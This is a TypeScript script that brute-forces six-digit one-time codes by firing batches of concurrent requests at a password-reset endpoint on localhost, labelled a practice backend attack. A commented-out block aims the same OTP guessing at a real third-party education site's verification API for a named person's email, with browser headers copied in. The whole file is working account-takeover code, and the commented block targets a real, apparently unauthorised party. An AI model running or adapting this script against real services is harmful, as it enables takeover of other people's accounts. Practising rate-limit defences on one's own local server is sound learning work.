import axios from "axios";
async function sendRequest(otp: string) {
    // Practice backend attack - -------------------------------------------------------
    let data = JSON.stringify({
      email: "test3@gmail.com",
      otp: otp,
      newPassword: "new@123",
    });

    let config = {
      method: "post",
      maxBodyLength: Infinity,
      url: "http://127.0.0.1:3000/reset-password",
      headers: {
        "Content-Type": "application/json",
      },
      data: data,
    };

    try {
      await axios.request(config);
    } catch (error) {}

// //   Harkirat website attcking------------------------------------------------------------
//   let config = {
//     method: "get",
//     maxBodyLength: Infinity,
//     url: "https://harkiratapi.classx.co.in/get/otpverify?useremail=harkirat.iitr%40gmail.com&otp=123123&mydeviceid&mydeviceid2",
//     headers: {
//       "accept-language": "en-US,en;q=0.9",
//       "auth-key": "appxapi",
//       "client-service": "Appx",
//       "device-type": "",
//       origin: "https://harkirat.classx.co.in",
//       priority: "u=1, i",
//       referer: "https://harkirat.classx.co.in/",
//       "sec-ch-ua": "Chromium;v=136, Google",
//       "sec-ch-ua-mobile": "?1",
//       "sec-ch-ua-platform": "Android",
//       "sec-fetch-dest": "empty",
//       "sec-fetch-mode": "cors",
//       "sec-fetch-site": "same-site",
//       source: "website",
//     },
//   };

//   try {
//     await axios.request(config);
//   } catch (error) {}
}

async function main() {
  for (let i = 100000; i <= 999999; i += 100) {
    const p = [];
    for (let j = 0; j <= 100; j++) {
      p.push(sendRequest((i + j).toString()));
    }
    console.log(i);
    await Promise.all(p);
  }
}

main();
